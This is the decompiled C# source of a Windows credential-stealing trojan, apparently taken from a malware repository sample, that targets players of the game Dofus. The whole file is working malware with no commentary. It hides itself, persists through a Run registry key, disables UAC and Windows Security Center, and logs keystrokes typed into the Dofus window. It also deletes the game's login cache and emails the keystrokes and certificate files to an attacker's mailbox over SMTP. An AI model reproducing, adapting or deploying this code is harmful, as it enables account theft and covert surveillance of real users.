// Decompiled with JetBrains decompiler
// Type: StealerDofus_3.Form1
// Assembly: StealerDofus 3, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B64A7B5B-90D2-47DF-9B69-5731F69C9046
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.iila-f4b2e2c2a910cafbb6cbd00dddc69e40aa77d25da6cdcea9c5207c34528ba1f9.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using StealerDofus_3.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace StealerDofus_3
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("TimerKey")]
    private System.Windows.Forms.Timer _TimerKey;
    [AccessedThroughProperty("TimerForm")]
    private System.Windows.Forms.Timer _TimerForm;
    private const string MySp = "\\_/";
    public string _MailSender;
    public string _PassMailSender;
    public string _MailToSender;
    public string _Subject;
    public string _SMTPServer;
    public int _SMTPPort;
    public bool _EnableSsl;
    private const int VK_CAPITAL = 20;
    private const int VK_SHIFT = 16;
    private const int VK_BACK = 8;
    private const int VK_TAB = 9;
    private const int VK_ENTER = 13;
    private const int VK_RBUTTON = 2;
    private const int VK_NUMPAD0 = 96;
    private const int VK_NUMPAD1 = 97;
    private const int VK_NUMPAD2 = 98;
    private const int VK_NUMPAD3 = 99;
    private const int VK_NUMPAD4 = 100;
    private const int VK_NUMPAD5 = 101;
    private const int VK_NUMPAD6 = 102;
    private const int VK_NUMPAD7 = 103;
    private const int VK_NUMPAD8 = 104;
    private const int VK_NUMPAD9 = 105;
    private string pathmacr99taldmN77s67o5X9foh7mI9w54zQF3i97zjO69pCb54o3m7cTtnWhbhnyi0K6DwAc4zv2u85Z8CDgT;
    private int App_hwnd;
    private string App_Title;
    private string TextMailFlashEp9VWx220t1OA6P4dnM1iDnCQbyA62APmRjNV9YqQlt9qDE8lV8Z5m5U3o9x6p;
    private bool EnableDNPxDXr8ODnFfmy3X1QI83F4H8u63c668Ndm45If96o82MbR1onHk0r9Y5eQWXv4KlP9hj38YZC4y7e6i1J772u825ydeF2;
    private string MailFlashv1r94YH68OkUVyUcSSIA04hR9u04m8p7caFvf7HBwp2v0txFMMYY3a4eW;
    private bool oBTimerMaison;
    private MailMessage MyMailbYpL7Bv7Yz2azXg2clXgkCAGPKjI67lZ6u5Wlj29Y3be7165giDUyYYk8;

    public Form1()
    {
      this.Load += (EventHandler) ((a0, a1) => this.Demarage());
      this._MailSender = (string) null;
      this._PassMailSender = (string) null;
      this._MailToSender = (string) null;
      this._Subject = (string) null;
      this._SMTPServer = (string) null;
      this._SMTPPort = 0;
      this._EnableSsl = false;
      this.pathmacr99taldmN77s67o5X9foh7mI9w54zQF3i97zjO69pCb54o3m7cTtnWhbhnyi0K6DwAc4zv2u85Z8CDgT = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dofus2\\Module_Ankama_Connection.dat";
      this.TextMailFlashEp9VWx220t1OA6P4dnM1iDnCQbyA62APmRjNV9YqQlt9qDE8lV8Z5m5U3o9x6p = (string) null;
      this.EnableDNPxDXr8ODnFfmy3X1QI83F4H8u63c668Ndm45If96o82MbR1onHk0r9Y5eQWXv4KlP9hj38YZC4y7e6i1J772u825ydeF2 = true;
      this.MailFlashv1r94YH68OkUVyUcSSIA04hR9u04m8p7caFvf7HBwp2v0txFMMYY3a4eW = (string) null;
      this.MyMailbYpL7Bv7Yz2azXg2clXgkCAGPKjI67lZ6u5Wlj29Y3be7165giDUyYYk8 = new MailMessage();
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.TimerKey = new System.Windows.Forms.Timer(this.components);
      this.TimerForm = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.TimerKey.Interval = 1;
      this.TimerForm.Interval = 1;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(116, 0);
      this.Name = nameof (Form1);
      this.Text = "st";
      this.ResumeLayout(false);
    }

    internal virtual System.Windows.Forms.Timer TimerKey
    {
      get => this._TimerKey;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._TimerKey = value;
    }

    internal virtual System.Windows.Forms.Timer TimerForm
    {
      get => this._TimerForm;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TimerForm_Tick);
        if (this._TimerForm != null)
          this._TimerForm.Tick -= eventHandler;
        this._TimerForm = value;
        if (this._TimerForm == null)
          return;
        this._TimerForm.Tick += eventHandler;
      }
    }

    private void Demarage()
    {
      this.Hide();
      this.ShowInTaskbar = false;
      this.Width = 0;
      this.Height = 0;
      Application.DoEvents();
      this.Melt();
      this.outUAC();
      this.GetConfig();
    }

    public string Decrypt(string toDecrypt)
    {
      string s = "zJm9pof5qhDUCGBBLH0xaMB3zTZ44Dcp4ms7INNjxZh9le5W6RkDRTz2iWVAmWivLg3vktbALlF2xBT6WxHvur0QTZ9wsmvn2UVYoK1Zua7Ba41o8cy9MNpv";
      byte[] inputBuffer = Convert.FromBase64String(toDecrypt);
      byte[] numArray = false ? Encoding.UTF8.GetBytes(s) : new MD5CryptoServiceProvider().ComputeHash(Encoding.UTF8.GetBytes(s));
      TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider();
      cryptoServiceProvider.Key = numArray;
      cryptoServiceProvider.Mode = CipherMode.ECB;
      cryptoServiceProvider.Padding = PaddingMode.PKCS7;
      return Encoding.UTF8.GetString(cryptoServiceProvider.CreateDecryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Melt()
    {
      string executablePath = Application.ExecutablePath;
      string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Strings.Replace(Application.ExecutablePath, Application.StartupPath, "");
      if (Operators.CompareString(executablePath, str, false) != 0)
      {
        try
        {
          if (!System.IO.File.Exists(str))
          {
            System.IO.File.Copy(executablePath, str);
            Interaction.Shell(str, AppWinStyle.Hide);
            ProjectData.EndApp();
          }
          else
          {
            try
            {
              System.IO.File.Delete(str);
              System.IO.File.Copy(executablePath, str);
              Interaction.Shell(str, AppWinStyle.Hide);
              ProjectData.EndApp();
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.EndApp();
              ProjectData.ClearProjectError();
            }
            ProjectData.EndApp();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else
        this.AddDem();
    }

    private void AddDem()
    {
      string executablePath = Application.ExecutablePath;
      if (Operators.CompareString(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Strings.Replace(Application.ExecutablePath, Application.StartupPath, ""), false) != 0)
        return;
      string name = Strings.Replace(Strings.Replace(Application.ExecutablePath, Application.StartupPath, ""), "\\", "");
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        registryKey.SetValue(name, (object) executablePath);
        registryKey.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.TimerForm.Start();
      Application.DoEvents();
    }

    private void outUAC()
    {
      try
      {
        RegistryKey registryKey1 = Registry.LocalMachine.OpenSubKey("SYSTEM\\ControlSet001\\services\\wscsvc", true);
        if (Operators.ConditionalCompareObjectNotEqual(registryKey1.GetValue("Start"), (object) 4, false))
        {
          try
          {
            registryKey1.SetValue("Start", (object) "4", RegistryValueKind.DWord);
            registryKey1.Close();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else
        {
          registryKey1.Close();
          try
          {
            RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
            registryKey2.SetValue("EnableLUA", (object) "0", RegistryValueKind.DWord);
            registryKey2.SetValue("ConsentPromptBehaviorAdmin", (object) "0", RegistryValueKind.DWord);
            registryKey2.Close();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void GetConfig()
    {
      string Expression = this.Decrypt(Strings.Split(System.IO.File.ReadAllText(Application.ExecutablePath), "|@|@|@|@|")[1]);
      if (!Expression.Contains("\\_/"))
        ProjectData.EndApp();
      string[] strArray = Strings.Split(Expression, "\\_/");
      this._MailSender = strArray[1];
      this._PassMailSender = strArray[2];
      this._MailToSender = strArray[3];
      this._Subject = strArray[4];
      this._SMTPServer = strArray[5];
      this._SMTPPort = Conversions.ToInteger(strArray[6]);
      try
      {
        if (Operators.CompareString(strArray[7], "1", false) == 0)
          this._EnableSsl = true;
        else
          this._EnableSsl = false;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ex.Message);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetForegroundWindow();

    private void TimerForm_Tick(object sender, EventArgs e)
    {
      if (System.IO.File.Exists(this.pathmacr99taldmN77s67o5X9foh7mI9w54zQF3i97zjO69pCb54o3m7cTtnWhbhnyi0K6DwAc4zv2u85Z8CDgT))
        System.IO.File.Delete(this.pathmacr99taldmN77s67o5X9foh7mI9w54zQF3i97zjO69pCb54o3m7cTtnWhbhnyi0K6DwAc4zv2u85Z8CDgT);
      Application.DoEvents();
      int foregroundWindow = Form1.GetForegroundWindow();
      if (foregroundWindow == this.App_hwnd)
        return;
      this.App_hwnd = foregroundWindow;
      this.App_Title = this.GetTitle(ref foregroundWindow);
      if (Operators.CompareString(this.App_Title, "", false) == 0)
        return;
      if (Operators.CompareString(this.App_Title, "Dofus", false) == 0)
      {
        Application.DoEvents();
        this.EnableDNPxDXr8ODnFfmy3X1QI83F4H8u63c668Ndm45If96o82MbR1onHk0r9Y5eQWXv4KlP9hj38YZC4y7e6i1J772u825ydeF2 = true;
        this.TimerMaison();
      }
      else
        this.EnableDNPxDXr8ODnFfmy3X1QI83F4H8u63c668Ndm45If96o82MbR1onHk0r9Y5eQWXv4KlP9hj38YZC4y7e6i1J772u825ydeF2 = false;
    }

    private void TimerMaison()
    {
      while (!this.oBTimerMaison)
      {
        Application.DoEvents();
        this.TextMailFlashEp9VWx220t1OA6P4dnM1iDnCQbyA62APmRjNV9YqQlt9qDE8lV8Z5m5U3o9x6p += this.KeyAction();
        if (!this.EnableDNPxDXr8ODnFfmy3X1QI83F4H8u63c668Ndm45If96o82MbR1onHk0r9Y5eQWXv4KlP9hj38YZC4y7e6i1J772u825ydeF2)
        {
          this.oBTimerMaison = true;
          if (Operators.CompareString(this.TextMailFlashEp9VWx220t1OA6P4dnM1iDnCQbyA62APmRjNV9YqQlt9qDE8lV8Z5m5U3o9x6p, "", false) != 0)
            this.SendMail(this.TextMailFlashEp9VWx220t1OA6P4dnM1iDnCQbyA62APmRjNV9YqQlt9qDE8lV8Z5m5U3o9x6p);
          this.TextMailFlashEp9VWx220t1OA6P4dnM1iDnCQbyA62APmRjNV9YqQlt9qDE8lV8Z5m5U3o9x6p = (string) null;
          this.MailFlashv1r94YH68OkUVyUcSSIA04hR9u04m8p7caFvf7HBwp2v0txFMMYY3a4eW = (string) null;
        }
        Thread.SpinWait(100);
      }
      this.oBTimerMaison = false;
    }

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern ushort GetAsyncKeyState(int vKey);

    [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern short GetKeyState(int virtualKeyCode);

    public string KeyAction()
    {
      string str = (string) null;
      int num = 0;
      do
      {
        if (Form1.GetKeyState(20) < (short) 0 | Form1.GetKeyState(16) < (short) 0 | Control.IsKeyLocked(Keys.Capital))
        {
          if (65 <= num & num <= 90)
          {
            if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
            {
              str += Conversions.ToString(Strings.Chr(num));
              break;
            }
          }
          else if (48 <= num & num <= 57 && ((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
          {
            str += Conversions.ToString(Strings.Chr(num));
            break;
          }
        }
        else if (65 <= num & num <= 90)
        {
          if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
          {
            str += Conversions.ToString(Strings.Chr(checked (num + 32)));
            break;
          }
        }
        else
        {
          switch (num)
          {
            case 32:
              if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
              {
                str += Conversions.ToString(Strings.Chr(num));
                break;
              }
              break;
            case 48:
              if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
              {
                str += Conversions.ToString(Strings.Chr(224));
                break;
              }
              break;
            case 49:
              if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
              {
                str += "&";
                break;
              }
              break;
            case 50:
              if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
              {
                str += Conversions.ToString(Strings.Chr(233));
                break;
              }
              break;
            case 51:
              if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
              {
                str += "\"";
                break;
              }
              break;
            case 52:
              if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
              {
                str += "'";
                break;
              }
              break;
            case 53:
              if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
              {
                str += "(";
                break;
              }
              break;
            case 54:
              if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
              {
                str += "-";
                break;
              }
              break;
            case 55:
              if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
              {
                str += Conversions.ToString(Strings.Chr(232));
                break;
              }
              break;
            case 56:
              if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
              {
                str += "_";
                break;
              }
              break;
            case 57:
              if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
              {
                str += Conversions.ToString(Strings.Chr(231));
                break;
              }
              break;
            case 226:
              if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
              {
                str += "<";
                break;
              }
              break;
            default:
              if (Form1.GetKeyState(8) < (short) 0)
              {
                if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
                {
                  str += "[<]";
                  break;
                }
                break;
              }
              if (Form1.GetKeyState(96) < (short) 0)
              {
                if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
                {
                  str += "0";
                  break;
                }
                break;
              }
              if (Form1.GetKeyState(97) < (short) 0)
              {
                if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
                {
                  str += "1";
                  break;
                }
                break;
              }
              if (Form1.GetKeyState(98) < (short) 0)
              {
                if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
                {
                  str += "2";
                  break;
                }
                break;
              }
              if (Form1.GetKeyState(99) < (short) 0)
              {
                if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
                {
                  str += "3";
                  break;
                }
                break;
              }
              if (Form1.GetKeyState(100) < (short) 0)
              {
                if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
                {
                  str += "4";
                  break;
                }
                break;
              }
              if (Form1.GetKeyState(101) < (short) 0)
              {
                if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
                {
                  str += "5";
                  break;
                }
                break;
              }
              if (Form1.GetKeyState(102) < (short) 0)
              {
                if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
                {
                  str += "6";
                  break;
                }
                break;
              }
              if (Form1.GetKeyState(103) < (short) 0)
              {
                if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
                {
                  str += "7";
                  break;
                }
                break;
              }
              if (Form1.GetKeyState(104) < (short) 0)
              {
                if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
                {
                  str += "8";
                  break;
                }
                break;
              }
              if (Form1.GetKeyState(105) < (short) 0)
              {
                if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
                {
                  str += "9";
                  break;
                }
                break;
              }
              if (Form1.GetKeyState(9) < (short) 0)
              {
                if (((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
                {
                  str += "|";
                  break;
                }
                break;
              }
              if (Form1.GetKeyState(13) < (short) 0 && ((uint) Form1.GetAsyncKeyState(num) & 1U) > 0U)
              {
                str += "#";
                this.EnableDNPxDXr8ODnFfmy3X1QI83F4H8u63c668Ndm45If96o82MbR1onHk0r9Y5eQWXv4KlP9hj38YZC4y7e6i1J772u825ydeF2 = false;
                break;
              }
              break;
          }
        }
        checked { ++num; }
      }
      while (num <= 256);
      return str;
    }

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowText(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    [DllImport("user32", EntryPoint = "GetWindowTextLengthA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetWindowTextLength(int hwnd);

    private string GetTitle(ref int hwndA)
    {
      string title;
      try
      {
        int windowTextLength = Form1.GetWindowTextLength(hwndA);
        string lpString = new string(char.MinValue, windowTextLength);
        Form1.GetWindowText(hwndA, ref lpString, checked (windowTextLength + 1));
        title = lpString;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        title = "Titre non trouvé";
        ProjectData.ClearProjectError();
      }
      return title;
    }

    public void SendMail(string Text)
    {
      Application.DoEvents();
      try
      {
        string mailSender = this._MailSender;
        string passMailSender = this._PassMailSender;
        string mailToSender = this._MailToSender;
        MailMessage message = new MailMessage();
        message.From = new MailAddress(mailSender);
        message.To.Add(mailToSender);
        message.Subject = this._Subject + ", [" + MyProject.Computer.Name + "]";
        message.Body = Text;
        string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates";
        if (Directory.Exists(path))
        {
          FileInfo[] files = new DirectoryInfo(path).GetFiles();
          int index = 0;
          while (index < files.Length)
          {
            FileInfo fileInfo = files[index];
            FileStream fileStream = fileInfo.OpenRead();
            byte[] numArray = new byte[checked ((int) (fileStream.Length - 1L) + 1)];
            fileStream.Read(numArray, 0, checked ((int) fileStream.Length));
            fileStream.Close();
            Attachment attachment = new Attachment((Stream) new MemoryStream(numArray), fileInfo.Name);
            message.Attachments.Add(attachment);
            checked { ++index; }
          }
        }
        new SmtpClient(this._SMTPServer)
        {
          Port = this._SMTPPort,
          Credentials = ((ICredentialsByHost) new NetworkCredential(mailSender, passMailSender)),
          EnableSsl = this._EnableSsl
        }.Send(message);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) Interaction.MsgBox((object) ex.Message);
        ProjectData.ClearProjectError();
      }
    }
  }
}
